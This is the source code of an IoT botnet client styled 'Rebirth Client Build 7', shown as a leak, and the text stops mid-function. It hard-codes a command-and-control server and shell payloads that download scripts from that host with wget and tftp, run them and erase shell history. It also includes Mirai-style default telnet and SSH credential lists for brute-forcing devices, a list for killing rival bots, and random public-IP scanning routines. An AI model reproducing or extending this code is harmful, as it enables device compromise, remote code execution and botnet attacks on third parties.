/*
DO NOT LEAK THIS FUCKING SHIT
I WORK TO DAMN HARD ON THIS CLIENT
THIS IS PRIVATE AS FUCK
IF YOU HAVE IT YOU ARE PRIVILAGED.

[*] Leaked by MrScythe [*]
@MrScytheLULZ
@fuckit.c
@reb00t3d_hydra

*/
/*
*** Rebirth Client ***
   *** Build 7 ***
   
Made By ~B1NARY~
Made Date: 12-10-16
 
Xmpp: b1nary@nigge.rs
Twitter: @P2PBOTNET
*/
#include <stdlib.h>
#include <stdarg.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>  
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>                                                      
#include <strings.h>                                                      
#include <sys/utsname.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <time.h>
#include <dirent.h>
#include <limits.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <string.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/param.h>
#include <sys/time.h>
 
#define PR_SET_NAME 15
#define SERVER_LIST_SIZE (sizeof(commServer) / sizeof(unsigned char *))
#define PAD_RIGHT 1
#define PAD_ZERO 2
#define PRINT_BUF_LEN 12
#define CMD_IAC   255
#define CMD_WILL  251
#define CMD_WONT  252
#define CMD_DO    253
#define CMD_DONT  254
#define OPT_SGA   3
#define SOCKBUF_SIZE 1024
 
 
 
char *getBuild() {
    #if defined(__x86_64__) || defined(_M_X64)
    return "x86_64";
    #elif defined(__i386) || defined(_M_IX86)
    return "x86_32";
    #elif defined(__ARM_ARCH_4T__) || defined(__TARGET_ARM_4T)
    return "ARM-4";
    #elif defined(__ARM_ARCH_5_) || defined(__ARM_ARCH_5E_)
    return "ARM-5"
    #elif defined(__ARM_ARCH_6_) || defined(__ARM_ARCH_6T2_)
    return "ARM-6";
    #elif defined(_mips__mips) || defined(__mips) || defined(__MIPS_) || defined(_mips)
    return "MIPS";
    #elif defined(__sh__)
    return "SUPERH";
    #elif defined(__powerpc) || defined(__powerpc_) || defined(_ppc_) || defined(__PPC__) || defined(_ARCH_PPC)
    return "POWERPC";
    #else
    return "UNKNOWN";
    #endif
}
const char *useragents[] = {
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0",
    "Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1",
    "Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",
    "Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)",
    "Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285",
    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7",
    "Mozilla/5.0 (PLAYSTATION 3; 3.55)",
    "Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2",
    "wii libnup/1.0",
    "Mozilla/4.0 (PSP (PlayStation Portable); 2.00)",
    "PSP (PlayStation Portable); 2.00",
    "Bunjalloo/0.7.6(Nintendo DS;U;en)",
    "Doris/1.15 [en] (Symbian)",
    "BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1",
    "BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100",
    "Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
    "Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01",
    "Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0",
    "SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
    "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0",
    "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)",
    "MOT-V300/0B.09.19R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0",
    "Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0",
    "Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000",
    "MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1"
};
struct telstate_t {
        int fd;
        unsigned int ip;
        unsigned char state;
        unsigned char complete;
        unsigned char usernameInd;  /* username     */
        unsigned char passwordInd;  /* password     */
        unsigned char tempDirInd;   /* tempdir      */
        unsigned int tTimeout;      /* totalTimeout */
        unsigned short bufUsed;
        char *sockbuf;
};
int initConnection();
void makeRandomStr(unsigned char *buf, int length);
int sockprintf(int sock, char *formatStr, ...);
char *inet_ntoa(struct in_addr in);
int mainCommSock = 0, currentServer = -1;
uint32_t *pids;
uint32_t scanPid;
uint64_t numpids = 0;
struct in_addr ourIP;
unsigned char macAddress[6] = {0};
 
 
unsigned char *commServer[] = { "104.168.170.60:666" };
char *Busybox_Payload = "cd /tmp || cd /var/system || cd /mnt || cd /lib;rm -f /tmp/ || /var/run/ || /var/system/ || /mnt/ || /lib/*;cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;busybox wget 104.168.170.60/bin.sh;chmod 777;sh bin.sh;busybox tftp -g 104.168.170.60 -r tftp1.sh;chmod 777 *;sh tftp1.sh;busybox tftp -g 104.168.170.60 -r tftp2.sh;chmod 777 *;sh tftp2.sh;rm -rf *sh;history -c;history -w;rm -rf ~/.bash_history;cd /tmp || cd /var/system || cd /mnt || cd /lib;rm -f /tmp/ || /var/run/ || /var/system/ || /mnt/ || /lib/*;cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;busybox wget 104.168.170.60/bins.sh;chmod 777;sh bins.sh;busybox tftp -g 104.168.170.60 -r tftp1.sh;chmod 777 *;sh tftp1.sh;busybox tftp -g 104.168.170.60 -r tftp2.sh;chmod 777 *;sh tftp2.sh;rm -rf *sh;history -c;history -w;rm -rf ~/.bash_history"; //Telnet Scanner Must implement Busybox.
char *Payload = "cd /tmp/;wget http://104.168.170.60/bins.sh;sh bins.sh;rm -rf bins.sh;cd /tmp/;wget http://104.168.170.60/bin.sh;sh bin.sh;rm -rf bis.sh"; //Normal Payload Without busybox Implemented.
 
char *Python_Temp_Directory = "/etc/.../"; //Temp directory The Python Scanner is Downloaded to and executed from.
char *Python_File_Location = "http://104.168.170.60/scan.py"; //Payload To Download The Python Scanner.
 
char *BINS_HOST_IP = "104.168.170.60";
char *BIN = "BIN.sh";
char *TFTP1 = "tftp1.sh";
char *TFTP2 = "tftp2.sh";
char *FTP1 = "ftp1.sh";
 
char *BINS1 = "lol1"; //MIPS
char *BINS2 = "lol2"; //MIPSEL
char *BINS3 = "lol3"; //SH4
char *BINS4 = "lol4"; //X86_64
char *BINS5 = "lol5"; //ARMV6L
char *BINS6 = "lol6"; //I686
char *BINS7 = "lol7"; //POWERPC
char *BINS8 = "lol8"; //I586
char *BINS9 = "lol9"; //M68K
char *BINS10 = "lol10"; //SPARC
char *BINS11 = "lol11"; //ARMV4L
char *BINS12 = "lol12"; //ARMV5L
char *BINS13 = "lol13"; //POWERPC440FP
 
 
char *Telnet_Usernames[] = {
   
    "telnet\0", //telnet:telnet
    "root\0", //root:root
    "root\0", //root:1234
    "root\0", //root:12345
    "root\0", //root:oelinux123
    "admin\0", //admin:admin
    "root\0", //root:Zte521
    "root\0", //root:vizxv
    "admin\0", //admin:1234
   
                           };
 
                           
char *Telnet_Passwords[] = {
   
    "telnet\0", //telnet:telnet
    "root\0", //root:root
    "1234\0", //root:1234
    "12345\0", //root:12345
    "oelinux123\0", //root:oelinux123
    "admin\0", //root:Zte521
    "vizxv\0", //root:vizxv
    "1234\0", //admin:1234
                           };
                           
                           
                           
                           
                           
                           
 
 
char *Mirai_Usernames[] = {
   
    "root\0", //root:xc3511
    "root\0", //root:vizxv
    "root\0", //root:admin
    "admin\0", //admin:admin
    "root\0", //root:888888
    "root\0", //root:xmhdipc
    "root\0", //root:default
    "root\0", //root:juantech
    "root\0", //root:123456
    "root\0", //root:54321
    "support\0", //support:support
    "root\0", //root:(none)
    "admin\0", //admin:password
    "root\0", //root:root
    "root\0", //root:12345
    "user\0", //user:user
    "admin\0", //admin:(none)
    "root\0", //root:pass
    "admin\0", //admin:admin1234
    "root\0", //root:1111
    "admin\0", //admin:smcadmin
    "admin\0", //admin:1111
    "root\0", //root:666666
    "root\0", //root:password
    "root\0", //root:1234
    "root\0", //root:klv123
    "Administrator\0", //Administrator:admin
    "service\0", //service:service
    "supervisor\0", //supervisor:supervisor
    "guest\0", //guest:guest
    "guest\0", //guest:12345
    "guest\0", //guest:12345
    "admin1\0", //admin1:password
    "administrator\0", //administrator:1234
    "666666\0", //666666:666666
    "888888\0", //888888:888888
    "ubnt\0", //ubnt:ubnt
    "klv1234\0", //root:klv1234
    "Zte521\0", //root:Zte521
    "hi3518\0", //root:hi3518
    "jvbzd\0", //root:jvbzd
    "anko\0", //root:anko
    "zlxx\0", //root:zlxx
    "7ujMko0vizxv\0", //root:7ujMko0vizxv
    "7ujMko0admin\0", //root:7ujMko0admin
    "system\0", //root:system
    "ikwb\0", //root:ikwb
    "dreambox\0", //root:dreambox
    "user\0", //root:user
    "realtek\0", //root:realtek
    "00000000\0", //root:00000000
    "1111111\0", //admin:1111111
    "1234\0", //admin:1234
    "12345\0", //admin:12345
    "54321\0", //admin:54321
    "123456\0", //admin:123456
    "7ujMko0admin\0", //admin:7ujMko0admin
    "1234\0", //admin:1234
    "pass\0", //admin:pass
    "meinsm\0", //admin:meinsm
    "tech\0", //tech:tech
    "fucker\0", //mother:fucker
};
   
char *Mirai_Passwords[] = {
   
    "xc3511\0", //root:xc3511
    "vizxv\0", //root:vizxv
    "admin\0", //root:admin
    "admin\0", //admin:admin
    "888888\0", //root:888888
    "xmhdipc\0", //root:xmhdipc
    "default\0", //root:default
    "juantech\0", //root:juantech
    "123456\0", //root:123456
    "54321\0", //root:54321
    "support\0", //support:support
    "\0", //root:(none)
    "password\0", //admin:password
    "root\0", //root:root
    "12345\0", //root:12345
    "user\0", //user:user
    "\0", //admin:(none)
    "pass\0", //root:pass
    "admin1234\0", //admin:admin1234
    "1111\0", //root:1111
    "smcadmin\0", //admin:smcadmin
    "1111\0", //admin:1111
    "666666\0", //root:666666
    "password\0", //root:password
    "1234\0", //root:1234
    "klv123\0", //root:klv123
    "admin\0", //Administrator:admin
    "service\0", //service:service
    "supervisor\0", //supervisor:supervisor
    "guest\0", //guest:guest
    "12345\0", //guest:12345
    "12345\0", //guest:12345
    "password\0", //admin1:password
    "1234\0", //administrator:1234
    "666666\0", //666666:666666
    "888888\0", //888888:888888
    "ubnt\0", //ubnt:ubnt
    "klv1234\0", //root:klv1234
    "Zte521\0", //root:Zte521
    "hi3518\0", //root:hi3518
    "jvbzd\0", //root:jvbzd
    "anko\0", //root:anko
    "zlxx\0", //root:zlxx
    "7ujMko0vizxv\0", //root:7ujMko0vizxv
    "7ujMko0admin\0", //root:7ujMko0admin
    "system\0", //root:system
    "ikwb\0", //root:ikwb
    "dreambox\0", //root:dreambox
    "user\0", //root:user
    "realtek\0", //root:realtek
    "00000000\0", //root:00000000
    "1111111\0", //admin:1111111
    "1234\0", //admin:1234
    "12345\0", //admin:12345
    "54321\0", //admin:54321
    "123456\0", //admin:123456
    "7ujMko0admin\0", //admin:7ujMko0admin
    "1234\0", //admin:1234
    "pass\0", //admin:pass
    "meinsm\0", //admin:meinsm
    "tech\0", //tech:tech
    "fucker\0", //mother:fucker
   
};
char *SSH_Usernames[] = {
    "root\0", //root:root
    "admin\0", //admin:admin
    "admin\0", //admin:1234
    "root\0", //root:1234
    "ubnt\0", //ubnt:ubnt
                        };
char *SSH_Passwords[] = {
    "root\0", //root:root
    "admin\0", //admin:admin
    "1234\0", //admin:1234
    "1234\0", //root:1234
    "ubnt\0", //ubnt:ubnt
                        };
 
char *Bot_Killer_Binarys[] = {
    "mips",
    "mipsel",
    "sh4",
    "x86",
    "i686",
    "ppc",
    "i586",
    "i586",
    "jack*",
    "hack*",
    "arm*"
    "tel*"
    "b1",
    "b2",
    "b3",
    "b4",
    "b5",
    "b6",
    "b7",
    "b8",
    "b9",
    "lol*",
    "busybox*",
    "badbox*",
    "DFhxdhdf",
    "dvrHelper",
    "FDFDHFC",
    "FEUB",
    "FTUdftui",
    "GHfjfgvj",
    "jhUOH",
    "JIPJIPJj",
    "JIPJuipjh",
    "kmyx86_64",
    "lolmipsel",
    "mips",
    "mipsel",
    "RYrydry",
    "TwoFace*",
    "UYyuyioy",
    "wget",
    "x86_64",
    "XDzdfxzf",
    "xx*",
    "sh",
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "10",
    "11",
    "12",
    "13",
    "14",
    "15",
    "16",
    "17",
    "18",
    "19",
    "20",
    "busybox",
    "badbox",
    "Mirai*",
    "mirai*",
    "cunty*"
    "IoT*"
    };
 
   
int PythonRanges[] = {
    5.78,
    49.150,
    91.98,
    91.99,
    101.108,
    101.109,
    119.93,
    122.3,
    122.52,
    122.54,
    124.104,
    124.105,
    124.106,
    124.107,
    125.25,
    125.26,
    125.27,
    125.2
                     };
   
   
char *Temp_Directorys[] = {"/tmp/*", "/var/*", "/var/run/*", "/var/tmp/*",  (char*) 0};
char *advances[] = {":", "user", "ogin", "name", "pass", "dvrdvs", "mdm9625", "9615-cdp", "F600", "F660", "F609", "BCM", (char*)0};                                                                                    
char *fails[] = {"nvalid", "ailed", "ncorrect", "enied", "rror", "oodbye", "bad", (char*)0};                                                       
char *successes[] = {"busybox", "$", "#", "shell", "dvrdvs", "mdm9625", "9615-cdp", "F600", "F660", "F609", "BCM", (char*)0};                                                                                                  
char *advances2[] = {"nvalid", "ailed", "ncorrect", "enied", "rror", "oodbye", "bad", "busybox", "$", "#", (char*)0};
                   
#define PHI 0x9e3779b9
static uint32_t Q[4096], c = 362436;
void init_rand(uint32_t x) {
        int i;
        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;
        for (i = 3; i < 4096; i++) Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}
uint32_t rand_cmwc(void) {
        uint64_t t, a = 18782LL;
        static uint32_t i = 4095;
        uint32_t x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (uint32_t)(t >> 32);
        x = t + c;
        if (x < c) {
                x++;
                c++;
        }
        return (Q[i] = r - x);
}
int contains_string(char* buffer, char** strings) {
        int num_strings = 0, i = 0;
        for(num_strings = 0; strings[++num_strings] != 0; );
        for(i = 0; i < num_strings; i++) {
                if(strcasestr(buffer, strings[i])) {
                        return 1;
                }
        }
        return 0;
}
int contains_success(char* buffer) {
        return contains_string(buffer, successes);
}
int contains_fail(char* buffer) {
        return contains_string(buffer, fails);
}
int contains_response(char* buffer) {
        return contains_success(buffer) || contains_fail(buffer);
}
int read_with_timeout(int fd, int timeout_usec, char* buffer, int buf_size) {      
        fd_set read_set;
        struct timeval tv;
        tv.tv_sec = 0;
        tv.tv_usec = timeout_usec;
        FD_ZERO(&read_set);
        FD_SET(fd, &read_set);
        if (select(fd+1, &read_set, NULL, NULL, &tv) < 1)
        return 0;
        return recv(fd, buffer, buf_size, 0);
}
int read_until_response(int fd, int timeout_usec, char* buffer, int buf_size, char** strings) {
        int num_bytes, i;
        memset(buffer, 0, buf_size);
        num_bytes = read_with_timeout(fd, timeout_usec, buffer, buf_size);
        if(buffer[0] == 0xFF) {
                negotiate(fd, buffer, 3);
        }
 
        if(contains_string(buffer, strings)) {
                return 1;
        }
 
        return 0;
}
const char* get_telstate_host(struct telstate_t* telstate) { // get host
        struct in_addr in_addr_ip;
        in_addr_ip.s_addr = telstate->ip;
        return inet_ntoa(in_addr_ip);
}
void advance_telstate(struct telstate_t* telstate, int new_state) { // advance
        if(new_state == 0) {
                close(telstate->fd);
        }
        telstate->tTimeout = 0;
        telstate->state = new_state;
        memset((telstate->sockbuf), 0, SOCKBUF_SIZE);
}
void reset_telstate(struct telstate_t* telstate) { // reset
        advance_telstate(telstate, 0);
        telstate->complete = 1;
}
void trim(char *str) {
        int i;
        int begin = 0;
        int end = strlen(str) - 1;
 
        while (isspace(str[begin])) begin++;
 
        while ((end >= begin) && isspace(str[end])) end--;
        for (i = begin; i <= end; i++) str[i - begin] = str[i];
 
        str[i - begin] = '\0';
}
static void printchar(unsigned char **str, int c) {
        if (str) {
                **str = c;
                ++(*str);
        }
        else (void)write(1, &c, 1);
}
static int prints(unsigned char **out, const unsigned char *string, int width, int pad) {
        register int pc = 0, padchar = ' ';
        if (width > 0) {
                register int len = 0;
                register const unsigned char *ptr;
                for (ptr = string; *ptr; ++ptr) ++len;
                if (len >= width) width = 0;
                else width -= len;
                if (pad & PAD_ZERO) padchar = '0';
        }
        if (!(pad & PAD_RIGHT)) {
                for ( ; width > 0; --width) {
                        printchar (out, padchar);
                        ++pc;
                }
        }
        for ( ; *string ; ++string) {
                printchar (out, *string);
                ++pc;
        }
        for ( ; width > 0; --width) {
                printchar (out, padchar);
                ++pc;
        }
        return pc;
}
static int printi(unsigned char **out, int i, int b, int sg, int width, int pad, int letbase) {
        unsigned char print_buf[PRINT_BUF_LEN];
        register unsigned char *s;
        register int t, neg = 0, pc = 0;
        register unsigned int u = i;
        if (i == 0) {
                print_buf[0] = '0';
                print_buf[1] = '\0';
                return prints (out, print_buf, width, pad);
        }
        if (sg && b == 10 && i < 0) {
                neg = 1;
                u = -i;
        }
 
        s = print_buf + PRINT_BUF_LEN-1;
        *s = '\0';
        while (u) {
                t = u % b;
                if( t >= 10 )
                t += letbase - '0' - 10;
                *--s = t + '0';
                u /= b;
        }
        if (neg) {
                if( width && (pad & PAD_ZERO) ) {
                        printchar (out, '-');
                        ++pc;
                        --width;
                }
                else {
                        *--s = '-';
                }
        }
 
        return pc + prints (out, s, width, pad);
}
static int print(unsigned char **out, const unsigned char *format, va_list args ) {
        register int width, pad;
        register int pc = 0;
        unsigned char scr[2];
        for (; *format != 0; ++format) {
                if (*format == '%') {
                        ++format;
                        width = pad = 0;
                        if (*format == '\0') break;
                        if (*format == '%') goto out;
                        if (*format == '-') {
                                ++format;
                                pad = PAD_RIGHT;
                        }
                        while (*format == '0') {
                                ++format;
                                pad |= PAD_ZERO;
                        }
                        for ( ; *format >= '0' && *format <= '9'; ++format) {
                                width *= 10;
                                width += *format - '0';
                        }
                        if( *format == 's' ) {
                                register char *s = (char *)va_arg( args, int );
                                pc += prints (out, s?s:"(null)", width, pad);
                                continue;
                        }
                        if( *format == 'd' ) {
                                pc += printi (out, va_arg( args, int ), 10, 1, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'x' ) {
                                pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'X' ) {
                                pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'A');
                                continue;
                        }
                        if( *format == 'u' ) {
                                pc += printi (out, va_arg( args, int ), 10, 0, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'c' ) {
                                scr[0] = (unsigned char)va_arg( args, int );
                                scr[1] = '\0';
                                pc += prints (out, scr, width, pad);
                                continue;
                        }
                }
                else {
out:
                        printchar (out, *format);
                        ++pc;
                }
        }
        if (out) **out = '\0';
        va_end( args );
        return pc;
}
int zprintf(const unsigned char *format, ...) {
        va_list args;
        va_start( args, format );
        return print( 0, format, args );
}
int szprintf(unsigned char *out, const unsigned char *format, ...) {
        va_list args;
        va_start( args, format );
        return print( &out, format, args );
}
int sockprintf(int sock, char *formatStr, ...) {
        unsigned char *textBuffer = malloc(2048);
        memset(textBuffer, 0, 2048);
        char *orig = textBuffer;
        va_list args;
        va_start(args, formatStr);
        print(&textBuffer, formatStr, args);
        va_end(args);
        orig[strlen(orig)] = '\n';
        zprintf("%s\n", orig);
        int q = send(sock,orig,strlen(orig), MSG_NOSIGNAL);
        free(orig);
        return q;
}
int wildString(const unsigned char* pattern, const unsigned char* string) {
        switch(*pattern) {
        case '\0': return *string;
        case '*': return !(!wildString(pattern+1, string) || *string && !wildString(pattern, string+1));
        case '?': return !(*string && !wildString(pattern+1, string+1));
        default: return !((toupper(*pattern) == toupper(*string)) && !wildString(pattern+1, string+1));
        }
}
int getHost(unsigned char *toGet, struct in_addr *i) {
        struct hostent *h;
        if((i->s_addr = inet_addr(toGet)) == -1) return 1;
        return 0;
}
void makeRandomStr(unsigned char *buf, int length) {
        int i = 0;
        for(i = 0; i < length; i++) buf[i] = (rand_cmwc()%(91-65))+65;
}
int recvLine(int socket, unsigned char *buf, int bufsize) {
        memset(buf, 0, bufsize);
        fd_set myset;
        struct timeval tv;
        tv.tv_sec = 30;
        tv.tv_usec = 0;
        FD_ZERO(&myset);
        FD_SET(socket, &myset);
        int selectRtn, retryCount;
        if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
                while(retryCount < 10) {
                        tv.tv_sec = 30;
                        tv.tv_usec = 0;
                        FD_ZERO(&myset);
                        FD_SET(socket, &myset);
                        if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
                                retryCount++;
                                continue;
                        }
                        break;
                }
        }
        unsigned char tmpchr;
        unsigned char *cp;
        int count = 0;
        cp = buf;
        while(bufsize-- > 1) {
                if(recv(mainCommSock, &tmpchr, 1, 0) != 1) {
                        *cp = 0x00;
                        return -1;
                }
                *cp++ = tmpchr;
                if(tmpchr == '\n') break;
                count++;
        }
        *cp = 0x00;
        return count;
}
int connectTimeout(int fd, char *host, int port, int timeout) {
        struct sockaddr_in dest_addr;
        fd_set myset;
        struct timeval tv;
        socklen_t lon;
        int valopt;
        long arg = fcntl(fd, F_GETFL, NULL);
        arg |= O_NONBLOCK;
        fcntl(fd, F_SETFL, arg);
        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(port);
        if(getHost(host, &dest_addr.sin_addr)) return 0;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
        int res = connect(fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
        if (res < 0) {
                if (errno == EINPROGRESS) {
                        tv.tv_sec = timeout;
                        tv.tv_usec = 0;
                        FD_ZERO(&myset);
                        FD_SET(fd, &myset);
                        if (select(fd+1, NULL, &myset, NULL, &tv) > 0) {
                                lon = sizeof(int);
                                getsockopt(fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
                                if (valopt) return 0;
                        }
                        else return 0;
                }
                else return 0;
        }
        arg = fcntl(fd, F_GETFL, NULL);
        arg &= (~O_NONBLOCK);
        fcntl(fd, F_SETFL, arg);
        return 1;
}
int listFork() {
        uint32_t parent, *newpids, i;
        parent = fork();
        if (parent <= 0) return parent;
        numpids++;
        newpids = (uint32_t*)malloc((numpids + 1) * 4);
        for (i = 0; i < numpids - 1; i++) newpids[i] = pids[i];
        newpids[numpids - 1] = parent;
        free(pids);
        pids = newpids;
        return parent;
}
int negotiate(int sock, unsigned char *buf, int len) {
        unsigned char c;
        switch (buf[1]) {
        case CMD_IAC: return 0;
        case CMD_WILL:
        case CMD_WONT:
        case CMD_DO:
        case CMD_DONT:
                c = CMD_IAC;
                send(sock, &c, 1, MSG_NOSIGNAL);
                if (CMD_WONT == buf[1]) c = CMD_DONT;
                else if (CMD_DONT == buf[1]) c = CMD_WONT;
                else if (OPT_SGA == buf[1]) c = (buf[1] == CMD_DO ? CMD_WILL : CMD_DO);
                else c = (buf[1] == CMD_DO ? CMD_WONT : CMD_DONT);
                send(sock, &c, 1, MSG_NOSIGNAL);
                send(sock, &(buf[2]), 1, MSG_NOSIGNAL);
                break;
        default:
                break;
        }
 
        return 0;
}
int matchPrompt(char *bufStr) {
        char *prompts = ":>%$#\0";
        int bufLen = strlen(bufStr);
        int i, q = 0;
        for(i = 0; i < strlen(prompts); i++) {
                while(bufLen > q && (*(bufStr + bufLen - q) == 0x00 || *(bufStr + bufLen - q) == ' ' || *(bufStr + bufLen - q) == '\r' || *(bufStr + bufLen - q) == '\n')) q++;
                if(*(bufStr + bufLen - q) == prompts[i]) return 1;
        }
        return 0;
}
in_addr_t getRandomPublicIP() {
        static uint8_t ipState[4] = {0};
        ipState[0] = rand() % 223;
        ipState[1] = rand() % 255;
        ipState[2] = rand() % 255;
        ipState[3] = rand() % 255;
        while(
                (ipState[0] == 0) ||
                (ipState[0] == 10) ||
                (ipState[0] == 100 && (ipState[1] >= 64 && ipState[1] <= 127)) ||
                (ipState[0] == 127) ||
                (ipState[0] == 169 && ipState[1] == 254) ||
                (ipState[0] == 172 && (ipState[1] <= 16 && ipState[1] <= 31)) ||
                (ipState[0] == 192 && ipState[1] == 0 && ipState[2] == 2) ||
                (ipState[0] == 192 && ipState[1] == 88 && ipState[2] == 99) ||
                (ipState[0] == 192 && ipState[1] == 168) ||
                (ipState[0] == 198 && (ipState[1] == 18 || ipState[1] == 19)) ||
                (ipState[0] == 198 && ipState[1] == 51 && ipState[2] == 100) ||
                (ipState[0] == 203 && ipState[1] == 0 && ipState[2] == 113) ||
                (ipState[0] >= 224)
        )
        {
                ipState[0] = rand() % 223;
                ipState[1] = rand() % 255;
                ipState[2] = rand() % 255;
                ipState[3] = rand() % 255;
        }
        char ip[16] = {0};
        szprintf(ip, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);
        return inet_addr(ip);
}
 
in_addr_t MiraiIPRanges()
{
        static uint8_t ipState[4] = {0};
        ipState[0] = rand() % 223;
        ipState[1] = rand() % 255;
        ipState[2] = rand() % 255;
        ipState[3] = rand() % 255;
        while(
                (ipState[0] == 127) ||                                         // 127.0.0.0/8      - Loopback
                (ipState[0] == 0) ||                                           // 0.0.0.0/8        - Invalid address space
                (ipState[0] == 3) ||                                           // 3.0.0.0/8        - General Electric Company
                (ipState[0] == 15 || ipState[0] == 16) ||                      // 15.0.0.0/7       - Hewlett-Packard Company
                (ipState[0] == 56) ||                                          // 56.0.0.0/8       - US Postal Service
                (ipState[0] == 10) ||                                          // 10.0.0.0/8       - Internal network
                (ipState[0] == 192 && ipState[1] == 168) ||                    // 192.168.0.0/16   - Internal network
                (ipState[0] == 172 && ipState[1] >= 16 && ipState[1] < 32) ||  // 172.16.0.0/14    - Internal network
                (ipState[0] == 100 && ipState[1] >= 64 && ipState[1] < 127) || // 100.64.0.0/10    - IANA NAT reserved
                (ipState[0] == 169 && ipState[1] > 254) ||                     // 169.254.0.0/16   - IANA NAT reserved
                (ipState[0] == 198 && ipState[1] >= 18 && ipState[1] < 20) ||  // 198.18.0.0/15    - IANA Special use
                (ipState[0] == 224) ||                                         // 224.*.*.*+       - Multicast
                (ipState[0] == 6 || ipState[0] == 7 || ipState[0] == 11 || ipState[0] == 21 || ipState[0] == 22 || ipState[0] == 26 || ipState[0] == 28 || ipState[0] == 29 || ipState[0] == 30 || ipState[0] == 33 || ipState[0] == 55 || ipState[0] == 214 || ipState[0] == 215)
        )
        {
                ipState[0] = rand() % 223;
                ipState[1] = rand() % 255;
                ipState[2] = rand() % 255;
                ipState[3] = rand() % 255;
        }
        char ip[16] = {0};
        szprintf(ip, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);
        return inet_addr(ip);
}
 
in_addr_t getRandomIP(in_addr_t netmask) {
        in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
        return tmp ^ ( rand_cmwc() & ~netmask);
}
unsigned short csum (unsigned short *buf, int count) {
        register uint64_t sum = 0;
        while( count > 1 ) { sum += *buf++; count -= 2; }
        if(count > 0) { sum += *(unsigned char *)buf; }
        while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
        return (uint16_t)(~sum);
}
unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph) {
